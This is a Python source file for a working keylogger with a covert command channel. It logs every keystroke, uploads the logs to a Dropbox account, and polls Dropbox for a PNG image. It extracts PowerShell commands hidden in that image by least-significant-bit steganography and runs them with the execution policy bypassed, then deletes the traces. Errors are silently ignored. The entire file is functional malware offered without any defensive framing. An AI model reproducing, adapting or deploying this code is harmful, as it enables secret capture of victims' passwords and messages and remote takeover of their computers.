import os
import subprocess
import time
import threading
import logging
from datetime import datetime
from pynput import keyboard
import dropbox
import numpy as np
from PIL import Image

# Configuration for Dropbox and logging
DROPBOX_ACCESS_TOKEN = "YOUR API KEY GOES HERE"
DROPBOX_FILE_PATH = "/commands.png"
LOCAL_FILE_PATH = "commands.png"
LOG_FILE = "keylog.txt"

# Initialize logging only for keystrokes
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

class DropboxHandler:
    def __init__(self, access_token):
        self.access_token = access_token
        self.dbx = dropbox.Dropbox(access_token)

    def upload_file(self, file_path):
        """Upload file to Dropbox with proper logging management."""
        if not os.path.exists(file_path):
            return

        # Properly close logging before file operations
        for handler in logging.root.handlers[:]:
            handler.close()
            logging.root.removeHandler(handler)
        logging.shutdown()
        time.sleep(1)

        try:
            boot_time = datetime.now().strftime("%d-%m-%Y_%H-%M")
            dropbox_path = f"/logs/keylog_{boot_time}.txt"

            with open(file_path, "rb") as f:
                self.dbx.files_upload(f.read(), dropbox_path, 
                                    mode=dropbox.files.WriteMode("overwrite"))
            os.remove(file_path)
        except Exception:
            pass

        # Restart logging for new keystrokes
        logging.basicConfig(filename=file_path, level=logging.DEBUG, 
                          format="%(asctime)s - %(message)s")

    def download_commands(self):
        """Download commands image from Dropbox."""
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            local_path = os.path.join(script_dir, LOCAL_FILE_PATH)

            with open(local_path, 'wb') as f:
                _, result = self.dbx.files_download(path=DROPBOX_FILE_PATH)
                f.write(result.content)
            return True
        except Exception:
            return False

class Keylogger:
    @staticmethod
    def on_press(key):
        """Handle and log keystrokes."""
        try:
            logging.info(f"{key.char}")
        except AttributeError:
            logging.info(f"[{key}]")
        return True

    def start(self):
        """Start keylogger in non-suppressing mode."""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

class CommandHandler:
    def __init__(self):
        self.powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

    def extract_commands(self, image_path):
        """Extract hidden commands from image using LSB steganography."""
        try:
            img = Image.open(image_path).convert('RGB')
            data = np.array(img)

            binary = ''.join([str(pixel & 1) for pixel in data.flatten()])
            text_length = int(binary[:16], 2)
            text_bits = binary[16:16 + (text_length * 8)]

            text = ''
            for i in range(0, len(text_bits), 8):
                if i + 8 <= len(text_bits):
                    char = chr(int(text_bits[i:i+8], 2))
                    text += char

            return text.strip()
        except Exception:
            return None

    def execute_commands(self, commands):
        """Execute extracted PowerShell commands."""
        if not commands:
            return

        try:
            ps_script = "temp_script.ps1"
            with open(ps_script, 'w') as f:
                f.write(commands)

            subprocess.run([
                self.powershell_path,
                "-ExecutionPolicy", "Bypass",
                "-File", ps_script
            ], capture_output=True, text=True, shell=True)

            if os.path.exists(ps_script):
                os.remove(ps_script)

        except Exception:
            pass

def main():
    """Main execution loop."""
    print("Starting program...")
    dropbox_handler = DropboxHandler(DROPBOX_ACCESS_TOKEN)
    command_handler = CommandHandler()
    
    # Upload any existing logs
    print("Checking for existing keylog file...")
    dropbox_handler.upload_file(LOG_FILE)
    
    # Start keylogger in background
    print("Starting keylogger in background...")
    keylogger = Keylogger()
    keylogger_thread = threading.Thread(target=keylogger.start, daemon=True)
    keylogger_thread.start()
    print("Keylogger active and monitoring keystrokes...")

    # Main command processing loop
    print("Entering main command processing loop...")
    while True:
        try:
            print("\nChecking Dropbox for new commands...")
            if dropbox_handler.download_commands():
                print("Downloaded command image successfully")
                
                if commands := command_handler.extract_commands(LOCAL_FILE_PATH):
                    print(f"Extracted commands: {commands}")
                    print("Executing commands...")
                    command_handler.execute_commands(commands)
                    print("Commands executed successfully")
                else:
                    print("No valid commands found in image")
                
                if os.path.exists(LOCAL_FILE_PATH):
                    print("Cleaning up command image...")
                    os.remove(LOCAL_FILE_PATH)
            else:
                print("No new commands found or download failed")
            
            print("Waiting 2 seconds before next check...")
            time.sleep(2)
            
        except Exception as e:
            print(f"Error in main loop: {str(e)}")

if __name__ == "__main__":
    main()